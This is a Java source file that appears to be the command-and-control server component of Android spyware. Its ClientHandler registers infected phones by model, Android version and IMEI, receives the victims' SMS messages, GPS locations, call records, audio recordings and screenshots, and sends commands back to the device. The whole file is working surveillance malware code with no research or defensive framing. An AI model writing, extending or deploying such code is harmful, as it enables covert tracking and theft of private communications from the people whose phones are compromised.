import java.io.*;
import java.net.Socket;

public class ClientHandler implements Runnable {
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private AdminPanel adminPanel;
    private String deviceInfo = "Unknown";
    private String imei = "Unknown";
    private String clientIP = "Unknown";
    private String deviceModel = "Unknown";
    private String androidVersion = "Unknown";

    public ClientHandler(Socket socket, AdminPanel adminPanel) {
        this.socket = socket;
        this.adminPanel = adminPanel;
        this.clientIP = socket.getInetAddress().getHostAddress();
        
        try {
            this.in = new DataInputStream(socket.getInputStream());
            this.out = new DataOutputStream(socket.getOutputStream());
        } catch (IOException e) {
            adminPanel.log("❌ Client handler error: " + e.getMessage());
        }
    }

    @Override
    public void run() {
        try {
            String message = in.readUTF();
            if (message.startsWith("INFO:")) {
                String info = message.substring(5);
                String[] parts = info.split("\\|");
                if (parts.length >= 4) {
                    deviceModel = parts[1];
                    androidVersion = parts[2];
                    deviceInfo = deviceModel + " (Android " + androidVersion + ")";
                    imei = parts[3];
                    adminPanel.log("✅ Device registered: " + deviceInfo + " - IMEI: " + imei);
                }
            }

            while (true) {
                String response = in.readUTF();
                processResponse(response);
            }
        } catch (EOFException e) {
            adminPanel.log("📴 Client disconnected: " + deviceInfo);
            AdminServer.removeClient(this);
        } catch (IOException e) {
            adminPanel.log("❌ Client error: " + e.getMessage());
            AdminServer.removeClient(this);
        }
    }

    private void processResponse(String response) {
        if (response.startsWith("SMS:")) {
            adminPanel.log("📱 [SMS] " + deviceInfo + ": " + response.substring(4));
        } else if (response.startsWith("GPS:")) {
            adminPanel.log("📍 [GPS] " + deviceInfo + ": " + response.substring(4));
        } else if (response.startsWith("CALL:")) {
            adminPanel.log("☎️ [CALL] " + deviceInfo + ": " + response.substring(5));
        } else if (response.startsWith("AUDIO:")) {
            adminPanel.log("🎤 [AUDIO] " + deviceInfo + ": " + response.substring(6));
        } else if (response.startsWith("SCREEN:")) {
            adminPanel.log("📸 [SCREENSHOT] " + deviceInfo + ": " + response.substring(7));
        } else if (response.startsWith("LOGS:")) {
            adminPanel.log("📋 [LOGS] " + deviceInfo + ": Activity data received");
        }
    }

    public void sendCommand(String command) throws IOException {
        out.writeUTF(command);
        out.flush();
    }

    public String getDeviceInfo() { return deviceInfo; }
    public String getIMEI() { return imei; }
    public String getClientIP() { return clientIP; }
    public String getDeviceModel() { return deviceModel; }
    public String getAndroidVersion() { return androidVersion; }
}
